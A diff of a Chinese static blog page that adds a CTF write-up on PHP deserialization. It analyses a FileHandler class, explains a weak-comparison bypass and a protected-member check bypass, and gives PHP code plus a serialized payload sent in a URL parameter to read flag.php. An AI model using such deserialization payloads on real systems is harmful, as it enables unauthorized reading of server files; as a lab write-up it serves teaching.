+        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>writeup：</strong></p>
+<p><strong>分析:</strong></p>
+<ol>
+<li>根据题目及源码中unserialize()判断此题考查反序列化</li>
+</ol>
+<p>  <img src="https://img-blog.csdnimg.cn/20210429224110400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ol start="2">
+<li><p>flag存储在flag.php中</p>
+<p><img src="https://img-blog.csdnimg.cn/20210429224125343.jpg" alt="在这里插入图片描述"></p>
+</li>
+</ol>
+<ol start="3">
+<li><p>题目中有两个魔术方法： <strong>construct()、destruct()</strong></p>
+<p> <img src="https://img-blog.csdnimg.cn/20210429224136782.jpg" alt="在这里插入图片描述"></p>
+</li>
+</ol>
+<p>  <img src="https://img-blog.csdnimg.cn/20210429224149702.jpg" alt="在这里插入图片描述"></p>
+<ol start="4">
+<li>destruct()中会调用process,且op=1写入,op=2读取</li>
+</ol>
+<p>  <img src="https://img-blog.csdnimg.cn/20210429224243312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>  <img src="https://img-blog.csdnimg.cn/20210429224323475.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ol start="5">
+<li>涉及对象FileHandler,变量op及filename,content,进行构造输出.</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+
+class FileHandler &#123;
+
+    public $op&#x3D;&#39; 2&#39;;
+    public $filename&#x3D;&#39;flag.php&#39;;
+    public $content&#x3D;&#39;jaa&#39;;                 &#x2F;&#x2F;变量content不涉及题目可随意填写
+&#125;
+$flag &#x3D; new FileHandler();
+$flag_1 &#x3D; serialize($flag);
+echo $flag_1;
+    
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>涉及:反序列化魔术方法调用，弱类型绕过,ascii绕过</strong></p>
+<ol>
+<li><p><code>使用该类对flag进行读取,这里面能利用的只有__destruct函数(析构函数)。__destruct函数对this-&gt;op进行了===判断并内容在2字符串时会赋值为1.</code></p>
+<p><code>procesa函数中使用==对$this-&gt;op进行判断(为2的情况下才能读取内容),因此这里存在弱类型比较,可以使用数字2或``字符串&#39; 2&#39;绕过判断。</code></p>
+</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20210429224343769.jpg" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210429224403987.jpg" alt="在这里插入图片描述"></p>
+<ol start="2">
+<li><code>is_valid函数还对序列化字符串进行了校验，因为成员被protected修饰,因此序列化字符串中会出现ascii为0的字符。经过测试,在PHP7.2+的环境中,使用publie修饰成员并序列化,反序列化后成员也会被public覆盖修饰。</code></li>
+</ol>
+<p><strong>实操:</strong></p>
+<p>上述步骤5构造输出:</p>
+<p><img src="https://img-blog.csdnimg.cn/20210429224418905.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到序列化后的字符串</p>
+<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p>
+<p>将该字符串传递给参数str并在url中以GET方式进行传参</p>
+<p><code>https://IP/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p>
+<p>之后查看源代码得到flag.</p>
+<p><img src="https://img-blog.csdnimg.cn/20210429224441269.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
                 
             </div>
@@ -653,7 +743,7 @@ XML文档构建模块一个 X">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/01/15/xml-ji-chu/">http://jaasenyi.github.io/2022/01/15/xml-ji-chu/</a>
+                    <a href="http://jaasenyi.github.io/2022/01/15/php-fan-xu-lie-hua/">http://jaasenyi.github.io/2022/01/15/php-fan-xu-lie-hua/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -693,6 +783,10 @@ XML文档构建模块一个 X">
                             
                                 <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
                                     <span class="chip bg-color">web安全基础</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -870,13 +964,12 @@ XML文档构建模块一个 X">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/01/15/xxe-lou-dong/">
+                <a href="/2022/01/15/sql-zhu-ru-lou-dong-jie-shao/">
                     <div class="card-image">
                         
+                        <img src="/medias/banner/sql.png" class="responsive-img" alt="SQL注入漏洞介绍">
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="XXE漏洞介绍">
-                        
-                        <span class="card-title">XXE漏洞介绍</span>
+                        <span class="card-title">SQL注入漏洞介绍</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -915,13 +1008,13 @@ XML文档构建模块一个 X">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/15/wen-jian-bao-han/">
+                <a href="/2022/01/15/xxe-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="文件包含漏洞">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="XXE漏洞介绍">
                         
-                        <span class="card-title">文件包含漏洞</span>
+                        <span class="card-title">XXE漏洞介绍</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -941,6 +1034,14 @@ XML文档构建模块一个 X">
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
+                        <span class="chip bg-color">web安全基础</span>
+                    </a>
+                    
                 </div>
                 
             </div>
